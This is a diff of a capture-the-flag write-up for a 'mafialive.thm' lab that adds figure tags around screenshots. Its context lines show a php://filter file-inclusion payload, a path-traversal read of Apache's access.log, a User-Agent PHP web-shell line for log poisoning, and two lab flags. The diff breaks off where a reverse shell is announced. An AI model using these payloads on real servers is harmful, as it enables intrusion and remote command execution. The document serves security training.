@@ -38,7 +38,9 @@ As we can see there are three open ports:
 
 We can now visit the web page through our browser.
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Knign/Write-ups/assets/110326359/02002d3e-c4d2-4e2f-9c9d-97bdac2067c3)
+</figure>
 
 The email address tells us what the other domain is.
 
@@ -53,11 +55,15 @@ mafialive.thm
 ###  Find flag 1
 Let's add `mafialive.thm` to our `/etc/hosts` file. 
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Knign/Write-ups/assets/110326359/b890fefa-3fed-4f5b-ad5a-e9e5a570d197)
+</figure>
 
 We can now check if we can find something in `mafialive.thm`.
 
+<figure style={{ textAlign: 'center' }}>
 ![4](https://github.com/Knign/Write-ups/assets/110326359/ff67a4a1-ef8a-4792-a25f-646dd390dcfc)
+</figure>
 
 ### Answer
 
@@ -70,11 +76,15 @@ thm{f0und_th3_r1ght_h0st_n4m3}
 ### Look for a page under development
 We can go to `/robots.txt` to see if any pages are disallowed. Those pages could be under development.
 
+<figure style={{ textAlign: 'center' }}>
 ![5](https://github.com/Knign/Write-ups/assets/110326359/11f57538-3f5e-4ec4-9ef7-34fce81aaebf)
+</figure>
 
 Let's go to `/test.php`.
 
+<figure style={{ textAlign: 'center' }}>
 ![6](https://github.com/Knign/Write-ups/assets/110326359/2f46a1da-b6c5-4ec0-a55f-0910602cbf09)
+</figure>
 
 ### Answer
 ```
@@ -86,7 +96,9 @@ test.php
 ### Find flag 2
 Let's try to read the source code of `/test.php`.
 
+<figure style={{ textAlign: 'center' }}>
 ![7](https://github.com/Knign/Write-ups/assets/110326359/57bc6ab4-2663-4185-80e4-4e8af52c14da)
+</figure>
 
 Looks like we are not allowed to read the `/test.php` source code.
 
@@ -96,7 +108,9 @@ We can use the `php://filter` to encode the source code to Base64 and bypass the
 http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![8](https://github.com/Knign/Write-ups/assets/110326359/d074adde-092f-4588-88a4-38ea1723a8c2)
+</figure>
 
 Let's decode the Base64 string.
 
@@ -187,11 +201,15 @@ Using this information we can craft an exploit that gives the Apache `àccess.lo
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../log/apache2/access.log
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![9](https://github.com/Knign/Write-ups/assets/110326359/566ffc49-9711-4216-b279-55e67f407e94)
+</figure>
 
 Let's intercept the request using Burpsuite.
 
+<figure style={{ textAlign: 'center' }}>
 ![11](https://github.com/Knign/Write-ups/assets/110326359/fc6e7358-7adb-41a9-94df-7177557cff53)
+</figure>
 
 We have to change the `User-Agent` field to the following:
 
@@ -199,7 +217,9 @@ We have to change the `User-Agent` field to the following:
 <?php system($_GET['cmd']); ?>
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![12](https://github.com/Knign/Write-ups/assets/110326359/900da28c-5ba6-4d87-847b-7df8f47edc72)
+</figure>
 
 We can now upload a PHP reverse shell to the server.
 ```title="PHP reverse shell"
